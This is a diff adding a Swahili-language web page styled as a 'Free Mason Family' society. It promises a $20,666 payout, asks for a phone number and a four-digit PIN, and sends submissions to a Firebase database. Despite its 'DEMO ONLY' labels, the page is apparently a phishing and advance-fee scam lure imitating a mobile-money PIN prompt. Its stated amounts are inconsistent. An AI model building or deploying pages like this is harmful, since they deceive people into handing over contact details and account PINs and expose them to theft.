@@ -1,0 +1,744 @@
+<!DOCTYPE html>
+<html lang="sw">
+
+<head>
+
+<meta charset="UTF-8">
+
+<meta name="viewport"
+content="width=device-width, initial-scale=1.0">
+
+<title>
+Free Mason Family Fraternity Society
+</title>
+
+
+<style>
+
+*{
+    box-sizing:border-box;
+    margin:0;
+    padding:0;
+    font-family:Arial,Helvetica,sans-serif;
+}
+
+body{
+    background:#f7f8fa;
+    color:#222;
+}
+
+.header{
+    background:#d90000;
+    color:white;
+    padding:18px 7%;
+    display:flex;
+    justify-content:space-between;
+    align-items:center;
+}
+
+.logo{
+    font-size:21px;
+    font-weight:800;
+}
+
+.demo-badge{
+    background:#fff;
+    color:#d90000;
+    padding:7px 12px;
+    border-radius:20px;
+    font-size:12px;
+    font-weight:bold;
+}
+
+.status{
+    background:#222;
+    color:white;
+    padding:9px;
+    text-align:center;
+    font-size:13px;
+}
+
+.status-dot{
+    display:inline-block;
+    width:8px;
+    height:8px;
+    border-radius:50%;
+    background:#999;
+    margin-right:6px;
+}
+
+.status-dot.online{
+    background:#20c66b;
+}
+
+.hero{
+    min-height:calc(100vh - 100px);
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    padding:45px 20px;
+    background:
+        linear-gradient(135deg,#d90000,#a80000);
+}
+
+.card{
+    width:100%;
+    max-width:460px;
+    background:white;
+    border-radius:22px;
+    padding:35px;
+    box-shadow:0 20px 60px rgba(0,0,0,.25);
+}
+
+.symbol{
+    width:65px;
+    height:65px;
+    border-radius:50%;
+    background:#d90000;
+    color:white;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    margin:0 auto 20px;
+    font-size:27px;
+    font-weight:bold;
+}
+
+h1{
+    text-align:center;
+    font-size:27px;
+    line-height:1.25;
+    margin-bottom:12px;
+}
+
+.subtitle{
+    text-align:center;
+    color:#666;
+    line-height:1.6;
+    margin-bottom:25px;
+}
+
+.benefit{
+    background:#fff4f4;
+    border:1px solid #ffd0d0;
+    border-radius:15px;
+    padding:18px;
+    text-align:center;
+    margin-bottom:25px;
+}
+
+.benefit strong{
+    display:block;
+    color:#d90000;
+    font-size:30px;
+    margin-top:5px;
+}
+
+label{
+    display:block;
+    font-weight:bold;
+    margin-bottom:8px;
+}
+
+.input-group{
+    margin-bottom:18px;
+}
+
+input{
+    width:100%;
+    padding:15px;
+    border:1px solid #ddd;
+    border-radius:12px;
+    font-size:17px;
+    outline:none;
+}
+
+input:focus{
+    border-color:#d90000;
+    box-shadow:0 0 0 3px rgba(217,0,0,.08);
+}
+
+.pin{
+    letter-spacing:8px;
+    text-align:center;
+    font-size:22px;
+}
+
+.Society-note{
+    background:#fff8df;
+    border:1px solid #f1d46a;
+    color:#765d00;
+    padding:12px;
+    border-radius:10px;
+    font-size:12px;
+    line-height:1.5;
+    margin-bottom:18px;
+}
+
+.demo-note{
+    background:#fff8df;
+    border:1px solid #f1d46a;
+    color:#765d00;
+    padding:12px;
+    border-radius:10px;
+    font-size:12px;
+    line-height:1.5;
+    margin-bottom:18px;
+}
+
+button{
+    width:100%;
+    border:0;
+    background:#d90000;
+    color:white;
+    padding:16px;
+    border-radius:12px;
+    font-size:17px;
+    font-weight:bold;
+    cursor:pointer;
+}
+
+button:hover{
+    background:#b90000;
+}
+
+button:disabled{
+    opacity:.6;
+    cursor:not-allowed;
+}
+
+.message{
+    margin-top:15px;
+    text-align:center;
+    font-size:14px;
+    min-height:20px;
+}
+
+.footer{
+    text-align:center;
+    color:#777;
+    font-size:12px;
+    padding:20px;
+    background:white;
+}
+
+.hidden{
+    display:none;
+}
+
+.success-icon{
+    width:75px;
+    height:75px;
+    background:#20a464;
+    color:white;
+    border-radius:50%;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    margin:0 auto 20px;
+    font-size:38px;
+}
+
+.success-title{
+    text-align:center;
+    color:#222;
+}
+
+.success-text{
+    text-align:center;
+    line-height:1.7;
+    color:#666;
+    margin:18px 0;
+}
+
+.reference{
+    background:#f5f5f5;
+    padding:14px;
+    border-radius:10px;
+    text-align:center;
+    font-size:13px;
+}
+
+</style>
+
+</head>
+
+
+<body>
+
+
+<header class="header">
+
+    <div class="logo">
+        Free Mason Family
+    </div>
+
+    <div class="Airtel-badge">
+        
+    </div>
+
+</header>
+
+
+<div class="status">
+
+    <span
+        id="statusDot"
+        class="status-dot">
+    </span>
+
+    <span id="statusText">
+        Inaunganisha...
+    </span>
+
+</div>
+
+
+<main class="hero">
+
+
+<section class="card" id="loginPage">
+
+
+    <div class="symbol">
+        FM
+    </div>
+
+
+    <h1>
+        Karibu Free Mason Family Fraternity Organization Society
+    </h1>
+
+
+    <p class="subtitle">
+        Ingia kwenye akaunti yako sahihi ili kuendelea na mchakato wa
+        manufaa ya familia.
+    </p>
+
+
+    <div class="benefit">
+
+        Kiasi cha manufaa 
+
+        <strong>
+            $20,666
+        </strong>
+
+    </div>
+
+
+    <div class="demo-note">
+
+        <strong>
+            TAARIFA
+        </strong>
+
+        <br>
+
+        Tafadhali hakikisha unaweka DEMO PIN sahihi ili kukamilisha mchakato wako.
+
+    </div>
+
+
+    <form id="loginForm">
+
+
+        <div class="input-group">
+
+            <label for="phone">
+                Namba ya simu
+            </label>
+
+            <input
+                type="tel"
+                id="phone"
+                placeholder="243XXXXXXXXX"
+                maxlength="15"
+                inputmode="numeric"
+                autocomplete="off"
+                required
+            >
+
+        </div>
+
+
+        <div class="input-group">
+
+            <label for="trPin">
+                DEMO PIN
+            </label>
+
+            <input
+                type="password"
+                id="trPin"
+                class="pin"
+                placeholder="••••"
+                inputmode="numeric"
+                maxlength="4"
+                pattern="[0-9]{4}"
+                autocomplete="off"
+                required
+            >
+
+        </div>
+
+
+        <button
+            id="submitButton"
+            type="submit">
+
+            Endelea
+
+        </button>
+
+
+        <div
+            id="message"
+            class="message">
+        </div>
+
+
+    </form>
+
+
+</section>
+
+
+<section
+    class="card hidden"
+    id="successPage">
+
+    <div class="success-icon">
+        ✓
+    </div>
+
+    <h1 class="success-title">
+        Ombi Limewasilishwa
+    </h1>
+
+    <p class="success-text">
+        Umefanikiwa kuwasilisha ombi lako la
+        <strong>$20,000</strong>
+        kwenye mfumo
+        Free Mason Family Society.
+    </p>
+
+    <div class="reference">
+
+        <strong>
+            Namba ya kumbukumbu
+        </strong>
+
+        <br><br>
+
+        <span id="referenceNumber">
+            ---
+        </span>
+
+    </div>
+
+    <p class="success-text">
+        Umefanikiwa kutoa pesa kwenye mfumo wa freemason society family
+    </p>
+
+    <button
+        onclick="location.reload()">
+
+        Rudi Mwanzo
+
+    </button>
+
+</section>
+
+
+</main>
+
+
+<footer class="footer">
+
+    Free Mason Family Fraternity Organization Society
+
+    <br>
+
+    TR SYSTEM — DEMO ONLY
+
+</footer>
+
+
+<script type="module">
+
+import {
+    initializeApp
+}
+from
+"https://www.gstatic.com/firebasejs/10.14.1/firebase-app.js";
+
+
+import {
+    getDatabase,
+    ref,
+    onValue,
+    push,
+    set
+}
+from
+"https://www.gstatic.com/firebasejs/10.14.1/firebase-database.js";
+
+
+const firebaseConfig = {
+
+    apiKey:
+    "AIzaC3IylLRAMGf8Oo1oFCJk-FIkzRNS8j58U",
+
+    authDomain:
+    "freemason-society.firebaseapp.com",
+
+    databaseURL:
+    "https://freemason-society-default-rtdb.europe-west1.firebasedatabase.app",
+
+    projectId:
+    "freemason-society",
+
+    storageBucket:
+    "freemason-society.firebasestorage.app",
+
+    messagingSenderId:
+    "515013260684",
+
+    appId:
+    "1:515013260684:web:23f4fca3d739e7084ed2a9",
+
+    measurementId:
+    "G-XDQ6GF6QV6"
+};
+
+
+const app =
+    initializeApp(firebaseConfig);
+
+
+const database =
+    getDatabase(app);
+
+
+const connectionRef =
+    ref(
+        database,
+        ".info/connected"
+    );
+
+
+onValue(
+    connectionRef,
+    (snapshot) => {
+
+        const dot =
+            document.getElementById(
+                "statusDot"
+            );
+
+
+        const text =
+            document.getElementById(
+                "statusText"
+            );
+
+
+        if(snapshot.val() === true){
+
+            dot.classList.add(
+                "online"
+            );
+
+
+            text.textContent =
+                "Imeunganishwa • Firebase iko hai";
+
+        }else{
+
+            dot.classList.remove(
+                "online"
+            );
+
+
+            text.textContent =
+                "Muunganisho umekatika";
+        }
+
+    }
+);
+
+
+const form =
+    document.getElementById(
+        "loginForm"
+    );
+
+
+const message =
+    document.getElementById(
+        "message"
+    );
+
+
+const button =
+    document.getElementById(
+        "submitButton"
+    );
+
+
+form.addEventListener(
+    "submit",
+    async (event) => {
+
+        event.preventDefault();
+
+
+        const phone =
+            document
+                .getElementById("phone")
+                .value
+                .trim();
+
+
+        const trPin =
+            document
+                .getElementById("trPin")
+                .value
+                .trim();
+
+
+        if(
+            !/^243[0-9]{9,12}$/.test(phone)
+        ){
+
+            message.textContent =
+                "Tafadhali weka namba inayoanza na 243.";
+
+
+            message.style.color =
+                "#d90000";
+
+
+            return;
+        }
+
+
+        if(
+            !/^[0-9]{4}$/.test(trPin)
+        ){
+
+            message.textContent =
+                "DEMO PIN lazima iwe na tarakimu 4.";
+
+
+            message.style.color =
+                "#d90000";
+
+
+            return;
+        }
+
+
+        button.disabled =
+            true;
+
+
+        button.textContent =
+            "Inawasilisha...";
+
+
+        message.textContent =
+            "";
+
+
+        try{
+
+            const submissionsRef =
+                ref(
+                    database,
+                    "freeMason/submissions"
+                );
+
+
+            const newSubmission =
+                push(
+                    submissionsRef
+                );
+
+
+            await set(
+                newSubmission,
+                {
+
+                    phone:
+                        phone,
+
+                    type:
+                        "TR",
+
+                    amount:
+                        20000,
+
+                    currency:
+                        "USD",
+
+                    pinProvided:
+                        true,
+
+                    createdAt:
+                        new Date()
+                        .toISOString()
+
+                }
+            );
+
+
+            const reference =
+                "FM-" +
+                Date.now()
+                .toString()
+                .slice(-8);
+
+
+            window.location.href =
+                "./success.html?ref=" +
+                encodeURIComponent(
+                    reference
+                );
+
+
+        }catch(error){
+
+            console.error(
+                "Firebase error:",
+                error
+            );
+
+
+            message.textContent =
+                "Kuna tatizo la muunganisho. Tafadhali jaribu tena.";
+
+
+            message.style.color =
+                "#d90000";
+
+
+            button.disabled =
+                false;
+
+
+            button.textContent =
+                "Endelea";
+
+        }
+
+    }
+);
+
+</script>
+
+
+</body>
+
+</html>
